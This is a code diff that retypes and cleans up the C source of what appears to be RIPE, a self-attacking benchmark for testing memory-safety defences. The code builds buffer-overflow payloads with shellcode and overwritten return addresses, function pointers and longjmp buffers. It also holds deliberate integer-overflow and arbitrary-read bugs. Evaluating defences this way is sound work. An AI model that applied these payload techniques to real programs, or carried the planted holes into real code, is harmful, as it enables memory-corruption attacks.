@@ -25,7 +25,7 @@ bool output_debug_info = false;
 #define print_reason(s) // fprintf(stderr, s)
 
 // shellcode is generated in perform_attack()
-char * shellcode_nonop[12];
+static uint8_t shellcode_nonop[12];
 
 #ifndef RIPE_DEF_TECHNIQUE
     #define RIPE_DEF_TECHNIQUE DIRECT
@@ -56,11 +56,12 @@ uint32_t dop_dest = 0xdeadbeef;
 
 static void attack_once(void);
 static int attack_wrapper(void);
-static int perform_attack(void (*stack_func_ptr_param)(void),
+static int perform_attack(func_t **stack_func_ptr_param,
                           jmp_buf *stack_jmp_buffer_param);
 static void dummy_function(void);
 static const char *hex_to_bin(char c);
 static void hex_to_string(char * str, size_t val);
+static void format_instruction(uint8_t *dest, size_t insn);
 
 static const char * const bin4b[16] = {"0000", "0001", "0010", "0011",
                                        "0100", "0101", "0110", "0111",
@@ -86,32 +87,32 @@ static char data_buffer1[256] = "d";
 static char data_buffer2[8] = "dummy";
 static char data_secret[32] = "success. Secret data leaked.\n";
 static int data_flag = 0700;
-static uint32_t * data_mem_ptr_aux[64] = { &dummy_function };
-static uint32_t * data_mem_ptr[64] = { &dummy_function };
-static int (* data_func_ptr)(const char *) = &dummy_function;
+static uint8_t * data_mem_ptr_aux[256] = { (uint8_t *)(uintptr_t)&dummy_function };
+static uint8_t * data_mem_ptr[256] = { (uint8_t *)(uintptr_t)&dummy_function };
+static func_t * data_func_ptr = &dummy_function;
 static jmp_buf data_jmp_buffer = { 1 };
 
 // control data destinations
 void
-shellcode_target();
+shellcode_target(void);
 void
-ret2libc_target();
+ret2libc_target(void);
 void
-rop_target();
+rop_target(void);
 void
-dop_target(char * buf, uint32_t auth);
+dop_target(uint8_t * buf, uint32_t auth);
 
 // contains buffer lower in memory than stack param, allowing for overflow
 void
-set_low_buf(char ** buf);
+set_low_buf(uint8_t ** buf);
 
 // integer overflow vulnerability
 void
-iof(char * buf, uint32_t iv);
+iof(uint8_t * buf, uint32_t iv);
 
 // arbitrary read bug
 void
-data_leak(char *buf);
+data_leak(uint8_t *buf);
 
 // forces length param to register and jumps before return for stack param attacks
 void
@@ -124,7 +125,7 @@ lj_func(jmp_buf lj_buf);
 // get ret address
 // ra written to stack one word higher than bp
 #define OLD_BP_PTR   __builtin_frame_address(0)
-#define RET_ADDR_PTR ((void **) OLD_BP_PTR - 1)
+#define RET_ADDR_PTR ((uintptr_t *) OLD_BP_PTR - 1)
 
 struct attack_form attack;
 
@@ -162,7 +163,8 @@ __attribute__ ((noinline)) // Make sure this function has its own stack frame
 static int
 attack_wrapper(void) {
     jmp_buf stack_jmp_buffer_param;
-    return perform_attack(&dummy_function, &stack_jmp_buffer_param);
+    func_t *stack_func_ptr_param = dummy_function;
+    return perform_attack(&stack_func_ptr_param, &stack_jmp_buffer_param);
 }
 
 /********************/
@@ -170,29 +172,29 @@ attack_wrapper(void) {
 /********************/
 static int
 perform_attack(
-    void (*stack_func_ptr_param)(void),
+    func_t ** stack_func_ptr_param,
     jmp_buf *stack_jmp_buffer_param)
 {
-    jmp_buf stack_jmp_buffer;
-
-    /* STACK TARGETS */
-    /*
-    Function Pointer
-    Two general pointers for indirect attack
-    DOP flag
-    Arbitrary read data
-    Overflow buffer
-    Vulnerable struct
+    /* STACK TARGETS
+        Function Pointer
+        Two general pointers for indirect attack
+        DOP flag
+        Arbitrary read data
+        Overflow buffer
+        Vulnerable struct
+        Long jump buffer
     */
-    int (* stack_func_ptr)(const char *);
-    long * stack_mem_ptr;
-    long * stack_mem_ptr_aux;
-    int stack_flag;
+    func_t * stack_func_ptr;
+    uint8_t * stack_mem_ptr;
+    uint8_t * stack_mem_ptr_aux;
+    uint32_t stack_flag;
     char stack_secret[32];
     strcpy(stack_secret, data_secret);
-    char stack_buffer[1024];
+    uint8_t stack_buffer[1024];
     struct attackme stack_struct;
     stack_struct.func_ptr = &dummy_function;
+    jmp_buf stack_jmp_buffer;
+
 
     /* HEAP TARGETS */
     /*
@@ -210,15 +212,15 @@ perform_attack(
     /* Two buffers declared to be able to chose buffer that gets allocated    */
     /* first on the heap. The other buffer will be set as a target, i.e. a    */
     /* heap array of function pointers.                                       */
-    char * heap_buffer1 = malloc(256 + sizeof(long));
-    char * heap_buffer2 = malloc(256 + sizeof(long));
-    char * heap_buffer3 = malloc(256 + sizeof(long));
+    uint8_t * heap_buffer1 = malloc(256 + sizeof(long));
+    uint8_t * heap_buffer2 = malloc(256 + sizeof(long));
+    uint8_t * heap_buffer3 = malloc(256 + sizeof(long));
 
-    int * heap_flag = malloc(sizeof(int *));
-    long * heap_mem_ptr_aux;
-    long * heap_mem_ptr;
+    uint32_t * heap_flag = malloc(sizeof(int *));
+    uint8_t * heap_mem_ptr_aux;
+    uint8_t * heap_mem_ptr;
     char * heap_secret;
-    int(**heap_func_ptr)(const char *) = 0;
+    func_t **heap_func_ptr = NULL;
     jmp_buf * heap_jmp_buffer;
 
     /* BSS TARGETS */
@@ -231,17 +233,17 @@ perform_attack(
     Longjmp buffer
     Vulnerable Struct
     */
-    static int (* bss_func_ptr)(const char *);
+    static func_t * bss_func_ptr;
     static int * bss_flag;
-    static long * bss_mem_ptr_aux;
-    static long * bss_mem_ptr;
+    static uint8_t * bss_mem_ptr_aux;
+    static uint8_t * bss_mem_ptr;
     static char bss_secret[32];
-    static char bss_buffer[256];
+    static uint8_t bss_buffer[256];
     static jmp_buf bss_jmp_buffer;
     static struct attackme bss_struct;
 
     /* Pointer to buffer to overflow */
-    char * buffer;
+    uint8_t * buffer;
     /* Address to target for direct (part of) overflow */
     void * target_addr;
     /* Address for second overflow (indirect ret2libc attack) */
@@ -277,13 +279,13 @@ perform_attack(
 
             // set up stack ptr with DOP target
             if (attack.inject_param == DATA_ONLY) {
-                stack_mem_ptr = &stack_flag;
+                stack_mem_ptr = (uint8_t *)&stack_flag;
             }
 
             // Also set the location of the function pointer and the
             // longjmp buffer on the heap (the same since only choose one)
             heap_func_ptr   = (void *) heap_buffer1;
-            heap_jmp_buffer = (void *) heap_buffer1;
+            heap_jmp_buffer = (jmp_buf *) malloc(sizeof(jmp_buf));
             break;
         case HEAP:
             /* Injection into heap buffer                            */
@@ -301,11 +303,11 @@ perform_attack(
             {
                 buffer = heap_buffer1;
                 // Set the location of the memory pointer on the heap
-                heap_mem_ptr_aux = (long *) heap_buffer2;
-                heap_mem_ptr     = (long *) heap_buffer3;
+                heap_mem_ptr_aux = heap_buffer2;
+                heap_mem_ptr     = heap_buffer3;
 
                 if (attack.code_ptr == VAR_LEAK) {
-                    heap_secret = heap_buffer2;
+                    heap_secret = (char *)heap_buffer2;
                     strcpy(heap_secret, data_secret);
                 }
                 // Also set the location of the function pointer and the
@@ -325,7 +327,7 @@ perform_attack(
 
             // set up heap ptr with DOP target
             if (attack.inject_param == DATA_ONLY) {
-                heap_mem_ptr = heap_flag;
+                heap_mem_ptr = (uint8_t *)heap_flag;
             }
             break;
         case DATA:
@@ -349,12 +351,12 @@ perform_attack(
             // set up data ptr with DOP target
             if (attack.inject_param == DATA_ONLY) {
                 data_flag     = 0;
-                *data_mem_ptr = &data_flag;
+                *data_mem_ptr = (uint8_t *)&data_flag;
             }
             // Also set the location of the function pointer and the
             // longjmp buffer on the heap (the same since only choose one)
-            heap_func_ptr   = (void *) heap_buffer1;
-            heap_jmp_buffer = heap_buffer1;
+            heap_func_ptr   = (func_t *)(uintptr_t)heap_buffer1;
+            heap_jmp_buffer = (jmp_buf *)heap_buffer1;
             break;
         case BSS:
             /* Injection into BSS buffer                             */
@@ -369,16 +371,15 @@ perform_attack(
 
             bss_flag = 0;
 
-            bss_mem_ptr_aux = &dummy_function;
-            bss_mem_ptr     = &dummy_function;
+            bss_mem_ptr_aux = (uint8_t*)(uintptr_t)&dummy_function;
+            bss_mem_ptr     = (uint8_t*)(uintptr_t)&dummy_function;
 
             // set up bss ptr with DOP target
             if (attack.inject_param == DATA_ONLY) {
-                bss_mem_ptr = &bss_flag;
+                bss_mem_ptr = (uint8_t *)&bss_flag;
             }
-            // Also set the location of the function pointer and the
-            // longjmp buffer on the heap (the same since only choose one)
-            heap_func_ptr = (void *) heap_buffer1;
+            // Also set the location of the function pointer on the heap
+            heap_func_ptr = (func_t *)(uintptr_t)heap_buffer1;
             break;
     }
 
@@ -415,7 +416,6 @@ perform_attack(
                     target_addr = stack_jmp_buffer_param;
                     break;
                 case LONGJMP_BUF_HEAP:
-                    target_addr = (void *) heap_jmp_buffer;
                     break;
                 case LONGJMP_BUF_DATA:
                     target_addr = data_jmp_buffer;
@@ -427,7 +427,6 @@ perform_attack(
                     target_addr = &stack_struct.func_ptr;
                     break;
                 case STRUCT_FUNC_PTR_HEAP:
-                    target_addr = (void *) heap_struct + 256;
                     break;
                 case STRUCT_FUNC_PTR_DATA:
                     target_addr = &data_struct.func_ptr;
@@ -506,11 +505,13 @@ perform_attack(
             payload.jmp_buffer = &stack_jmp_buffer;
             break;
         case LONGJMP_BUF_STACK_PARAM:
-            if (setjmp(stack_jmp_buffer_param) != 0) {
+            if (setjmp(*stack_jmp_buffer_param) != 0) {
                 printf("Longjmp attack failed. Returning normally...\n");
                 return 1;
             }
-            payload.jmp_buffer = &stack_jmp_buffer_param;
+            // jmp_buf is an array type and thus degenerates on passing as parameter.
+            // To avoid a warning here we have to jump through this weird hoop.
+            payload.jmp_buffer = &(stack_jmp_buffer_param[0]);
             break;
         case LONGJMP_BUF_HEAP:
             if (setjmp(*heap_jmp_buffer) != 0) {
@@ -518,7 +519,6 @@ perform_attack(
                 return 1;
             }
             payload.jmp_buffer = (void *) heap_jmp_buffer;
-            payload.stack_jmp_buffer_param = NULL;
             break;
         case LONGJMP_BUF_DATA:
             if (setjmp(data_jmp_buffer) != 0) {
@@ -526,7 +526,6 @@ perform_attack(
                 return 1;
             }
             payload.jmp_buffer = (void *) data_jmp_buffer;
-            payload.stack_jmp_buffer_param = NULL;
             break;
         case LONGJMP_BUF_BSS:
             if (setjmp(bss_jmp_buffer) != 0) {
@@ -534,7 +533,6 @@ perform_attack(
                 return 1;
             }
             payload.jmp_buffer = (void *) bss_jmp_buffer;
-            payload.stack_jmp_buffer_param = NULL;
             break;
         default:
             break;
@@ -549,7 +547,7 @@ perform_attack(
             switch (attack.inject_param) {
                 case RETURN_INTO_LIBC:
                     // simulate ret2libc by invoking mock libc function
-                    payload.overflow_ptr = &ret2libc_target;
+                    payload.overflow_ptr = (void *)(uintptr_t)&ret2libc_target;
                     break;
                 case RETURN_ORIENTED_PROGRAMMING:
                     payload.overflow_ptr = (void *)((uintptr_t)&rop_target + PROLOGUE_LENGTH);
@@ -559,7 +557,7 @@ perform_attack(
                     break;
                 case DATA_ONLY:
                     // corrupt variable with nonzero value
-                    payload.overflow_ptr = 0xdeadbeef;
+                    payload.overflow_ptr = (void *)0xdeadbeef;
                     break;
                 default:
                     if (output_debug_info) {
@@ -583,7 +581,7 @@ perform_attack(
                     payload.overflow_ptr = &stack_func_ptr_param;
                     break;
                 case FUNC_PTR_HEAP:
-                    payload.overflow_ptr = heap_func_ptr;
+                    payload.overflow_ptr = (void *)(uintptr_t)heap_func_ptr;
                     break;
                 case FUNC_PTR_BSS:
                     payload.overflow_ptr = &bss_func_ptr;
@@ -595,7 +593,7 @@ perform_attack(
                     payload.overflow_ptr = &stack_struct.func_ptr;
                     break;
                 case STRUCT_FUNC_PTR_HEAP:
-                    payload.overflow_ptr = (void *) heap_struct + 256;
+                    payload.overflow_ptr = heap_struct + 256;
                     break;
                 case STRUCT_FUNC_PTR_DATA:
                     payload.overflow_ptr = &data_struct.func_ptr;
@@ -643,7 +641,7 @@ perform_attack(
 
     // ------------------------------------------------------
     /* Calculate payload size for overflow of chosen target address */
-    if ((unsigned long) target_addr > (unsigned long) buffer) {
+    if ((uintptr_t) target_addr > (uintptr_t) buffer) {
         payload.size =
           (unsigned int) ((unsigned long) target_addr + sizeof(long)
           - (unsigned long) buffer
@@ -651,7 +649,7 @@ perform_attack(
                 /* used with string functions in standard library */
 
         if (output_debug_info)
-            fprintf(stderr, "payload size == %d\n", payload.size);
+            fprintf(stderr, "payload size == %zd\n", payload.size);
     } else {
         if (output_debug_info)
             fprintf(stderr, "Error calculating size of payload\n");
@@ -679,22 +677,22 @@ perform_attack(
             memcpy(buffer, payload.buffer, payload.size - 1);
             break;
         case STRCPY:
-            strcpy(buffer, payload.buffer);
+            strcpy((char *)buffer, payload.buffer);
             break;
         case STRNCPY:
-            strncpy(buffer, payload.buffer, payload.size);
+            strncpy((char *)buffer, payload.buffer, payload.size);
             break;
         case SPRINTF:
-            sprintf(buffer, "%s", payload.buffer);
+            sprintf((char *)buffer, "%s", payload.buffer);
             break;
         case SNPRINTF:
-            snprintf(buffer, payload.size, "%s", payload.buffer);
+            snprintf((char *)buffer, payload.size, "%s", payload.buffer);
             break;
         case STRCAT:
-            strcat(buffer, payload.buffer);
+            strcat((char *)buffer, payload.buffer);
             break;
         case STRNCAT:
-            strncat(buffer, payload.buffer, payload.size);
+            strncat((char *)buffer, payload.buffer, payload.size);
             break;
         case SSCANF:
             snprintf(format_string_buf, 15, "%%%ic", payload.size);
@@ -727,7 +725,7 @@ perform_attack(
 
             if (attack.inject_param == RETURN_INTO_LIBC) {
                 // auxilliary overflow to give attacker control of a second general ptr
-                payload.overflow_ptr = &ret2libc_target;
+                payload.overflow_ptr = (void *)(uintptr_t)&ret2libc_target;
                 payload.size         = (uintptr_t) target_addr_aux
                   - (uintptr_t) buffer + sizeof(long) + 1;
                 build_payload(&payload);
@@ -772,26 +770,25 @@ perform_attack(
         case RET_ADDR:
             break;
         case FUNC_PTR_STACK_VAR:
-            stack_func_ptr(NULL);
+            stack_func_ptr();
             break;
         case FUNC_PTR_STACK_PARAM:
-            ((int (*)(char *, int))(*stack_func_ptr_param))(NULL, 0);
+            (*stack_func_ptr_param)();
             break;
         case FUNC_PTR_HEAP:
-            ((int (*)(char *, int)) * heap_func_ptr)(NULL, 0);
+            (*heap_func_ptr)();
             break;
         case FUNC_PTR_BSS:
-            ((int (*)(char *, int))(*bss_func_ptr))(NULL, 0);
+            (*bss_func_ptr)();
             break;
-
         case FUNC_PTR_DATA:
-            ((int (*)(char *, int))(*data_func_ptr))(NULL, 0);
+            (*data_func_ptr)();
             break;
         case LONGJMP_BUF_STACK_VAR:
             lj_func(stack_jmp_buffer);
             break;
         case LONGJMP_BUF_STACK_PARAM:
-            lj_func(stack_jmp_buffer_param);
+            lj_func(*stack_jmp_buffer_param);
             break;
         case LONGJMP_BUF_HEAP:
             lj_func(*heap_jmp_buffer);
@@ -803,16 +800,16 @@ perform_attack(
             lj_func(bss_jmp_buffer);
             break;
         case STRUCT_FUNC_PTR_STACK:
-            ((int (*)(char *, int)) * (stack_struct.func_ptr))(NULL, 0);
+            (*stack_struct.func_ptr)();
             break;
         case STRUCT_FUNC_PTR_HEAP:
-            (*heap_struct->func_ptr)(NULL, 0);
+            (*heap_struct->func_ptr)();
             break;
         case STRUCT_FUNC_PTR_DATA:
-            (*data_struct.func_ptr)(NULL, 0);
+            (*data_struct.func_ptr)();
             break;
         case STRUCT_FUNC_PTR_BSS:
-            (*bss_struct.func_ptr)(NULL, 0);
+            (*bss_struct.func_ptr)();
             break;
         case VAR_BOF:
         case VAR_IOF:
@@ -849,7 +846,7 @@ build_payload(struct payload * payload)
     
     switch (attack.inject_param) {
         case INJECTED_CODE_NO_NOP:
-            if (payload->size < (size_shellcode_nonop + sizeof(long))) {
+            if (payload->size < (size_shellcode_nonop + sizeof(func_t*))) {
                 return false;
             }
             shellcode      = shellcode_nonop;
@@ -888,13 +885,13 @@ build_payload(struct payload * payload)
     /* Calculate number of bytes to pad with */
     /* size - shellcode - target address - null terminator */
     bytes_to_pad =
-      (payload->size - size_shellcode - sizeof(long) - sizeof(char));
+      (payload->size - size_shellcode - sizeof(void *) - sizeof(char));
 
     /* Pad payload buffer with dummy bytes */
     memset((payload->buffer + size_shellcode), 'A', bytes_to_pad);
 
     if (output_debug_info) {
-        fprintf(stderr, "bytes to pad: %d\n", bytes_to_pad);
+        fprintf(stderr, "bytes to pad: %zd\n", bytes_to_pad);
         fprintf(stderr, "\noverflow_ptr: %p\n", payload->overflow_ptr);
     }
 
@@ -902,7 +899,7 @@ build_payload(struct payload * payload)
     if (attack.code_ptr != VAR_IOF) {
         memcpy(&(payload->buffer[size_shellcode + bytes_to_pad]),
           &payload->overflow_ptr,
-          sizeof(long));
+          sizeof(void *));
     }
 
     /* Finally, add the terminating null character at the end */
@@ -954,12 +951,12 @@ ret2libc_target()
 }
 
 void
-dop_target(char * buf, uint32_t auth)
+dop_target(uint8_t * buf, uint32_t auth)
 {
     size_t auth_loc = auth;
 
     if (attack.code_ptr == VAR_IOF) {
-        iof(buf, &auth_loc);
+        iof(buf, (uintptr_t)&auth_loc);
     }
 
     if (!auth_loc) {
@@ -979,9 +976,9 @@ rop_target(void)
 }
 
 void
-set_low_buf(char ** buf)
+set_low_buf(uint8_t ** buf)
 {
-    char low_buf[1024];
+    uint8_t low_buf[1024];
 
     if (output_debug_info)
         fprintf(stderr, "Inside set_low_buf()\n");
@@ -989,23 +986,23 @@ set_low_buf(char ** buf)
 }
 
 void
-iof(char * buf, uint32_t iv)
+iof(uint8_t * buf, uint32_t iv)
 {
     char * map;
     uint32_t key = iv;
-    uint8_t len  = strlen(buf);
+    size_t len  = strlen((char *)buf);
 
     // 0-length allocation and vulenrable hash operations
-    map      = malloc(len * sizeof(char));
-    key     -= (uint32_t) map;
+    map      = malloc(len * sizeof(uint8_t));
+    key     -= (uintptr_t) map;
     key     &= (uint16_t) len - 1;
     map[key] = 0xa1;
 }
 
 void
-data_leak(char *buf) {
+data_leak(uint8_t *buf) {
     uint16_t size = buf[0] + (buf[1] * 0x100), i;
-    char *msg = (char *)malloc(size);
+    uint8_t *msg = malloc(size);
 
     memcpy(msg, buf + 2, size);
     for (i = 0; i < size; i++) {
@@ -1019,7 +1016,7 @@ data_leak(char *buf) {
 /* BUILD_SHELLCODE() */
 /*********************/
 void
-build_shellcode(char * shellcode)
+build_shellcode(uint8_t * shellcode)
 {
     char attack_addr[9], low_bits[4], high_bits[6];  // target address and its components
     // fix shellcode when lower bits would become negative
@@ -1091,10 +1088,10 @@ hex_to_string(char * str, size_t val)
 }
 
 // format instruction and append to destination string
-void
-format_instruction(char * dest, size_t insn)
+static void
+format_instruction(uint8_t * dest, size_t insn)
 {
-    char insn_bytes[4];
+    uint8_t insn_bytes[4];
 
     insn_bytes[0] = (insn >> 24) & 0xff;
     insn_bytes[1] = (insn >> 16) & 0xff;
